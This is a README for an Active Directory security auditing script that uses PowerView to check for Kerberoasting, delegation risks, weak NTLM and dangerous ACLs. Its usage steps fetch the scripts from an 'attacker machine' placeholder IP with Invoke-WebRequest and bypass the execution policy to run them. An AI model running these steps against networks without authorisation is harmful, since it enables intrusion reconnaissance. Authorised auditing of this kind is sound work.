
# 🛡️ AD-Nebty-Scanner

**The Ultimate Active Directory Baseline & Security Auditor (PowerView Edition).**



`AD-Nebty-Scanner` is a comprehensive PowerShell auditing tool designed to rapidly identify misconfigurations, privilege escalation vectors, and security gaps within an Active Directory environment. It leverages `PowerView` to perform deep reconnaissance without requiring external binary tools.

## 🚀 Features

This script performs **17+ critical checks** and provides a visual "Traffic Light" scorecard (🔴 VULN | 🟡 WARN | 🟢 SECURE):

* **Domain Recon:** Basic context, machine account quotas (MAQ), and Domain Trusts.
* **Vulnerability Checks:** PrintNightmare (Spooler on DCs), PetitPotam (EFS), and ADCS infrastructure detection.
* **Authentication Hygiene:** NTLMv1/v2 checks, SMB Signing enforcement, LLMNR/NBT-NS, and WPAD usage.
* **Roasting Attacks:** Identification of Kerberoastable (SPN) and AS-REP Roastable (No-PreAuth) accounts.
* **Delegation Risks:** Full audit of Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD).
* **Account Hygiene:** `KRBTGT` password age (Golden Ticket risk) and accounts with "Password Not Required".
* **Critical Objects:** Analysis of `AdminSDHolder`, `Pre-Windows 2000 Compatible Access`, and `DnsAdmins` groups.
* **ACL/ACE Analysis:** Scans for dangerous Write permissions (Shadow Credentials) on Users, GPOs, and Admin Groups.
* **DCSync Rights:** Detection of non-standard accounts with `Replicating Directory Changes` rights.

## 📦 Prerequisites

* **PowerShell v3.0+**
* **PowerView:** This script depends on `PowerView.ps1`. It must be loaded into the session first.
* **Standard User Access:** Most checks work with a regular domain user account.

## 📥 Installation & Usage

The easiest way to transfer the tools to a target machine is by hosting them on your attacking machine (e.g., Kali Linux) and downloading them via PowerShell.

### 1. Prepare your Attacker Machine
Navigate to the folder containing `AD-Nebty-Scanner.ps1` and `PowerView.ps1`, then start a simple HTTP server:

```bash
# Python 3
python3 -m http.server 8000
````

### 2\. Download to Target Machine

On the target Windows machine, use `Invoke-WebRequest` to download the required files. You can run this block to download both files at once:

```powershell
# Create a directory (optional)
mkdir C:\Users\Public\Nebty
cd C:\Users\Public\Nebty

# Download PowerView and the Scanner
$IP = "YOUR_ATTACKER_IP" # <--- Replace with your IP
$Port = "8000"

"PowerView.ps1", "AD-Nebty-Scanner.ps1" | ForEach-Object {
    Invoke-WebRequest -Uri "http://$($IP):$($Port)/$_" -OutFile ".\$_" -UseBasicParsing
    Write-Host "Downloaded $_"
}
```

### 3\. Execute the Scan

Once the files are on the disk, bypass the execution policy (for the current process only), load PowerView, and run the scanner:

```powershell
# 1. Set Execution Policy
Set-ExecutionPolicy Bypass -Scope Process -Force

# 2. Load PowerView (Required dependency)
. .\PowerView.ps1

# 3. Run the Nebty Scanner
. .\AD-Nebty-Scanner.ps1
```

## 📊 Output Example

The script uses a synchronized execution model (stable) and outputs a clean, color-coded report.

```text
############################################################
                  SCAN SCORECARD                            
############################################################

CRITICAL FINDINGS:
 [!] Privilege: Running as Local Administrator (Be careful)
 [!] NTLM: NTLM Level is  (Weak). Relay possible.
 [!] SMB Sign: SMB Signing NOT required on this host.
 [!] LLMNR: LLMNR is enabled (or default).
 [!] EFSRPC: EFS Service running on 1 DC(s) (PetitPotam risk).
 [!] Kerberoast: Found 8 Kerberoastable accounts.
 [!] Unconstrained: Found 1 Unconstrained Delegation computers (Critical):
 [!] UserACLs: Found 46448 suspicious Write ACLs on Users (Shadow Creds).
 [!] GPO ACLs: Found 14 suspicious Write ACLs on GPOs.

WARNINGS / MANUAL REVIEW:
 [-] Passwords: Check failed.

SUMMARY STATS:
  Vulnerable : 9
  Warnings   : 1
  Secure     : 12

Scan Complete.
```

## ⚠️ Disclaimer

This tool is provided for educational and authorized security auditing purposes only. The author is not responsible for any misuse or damage caused by this tool. Always obtain proper authorization before auditing a network.
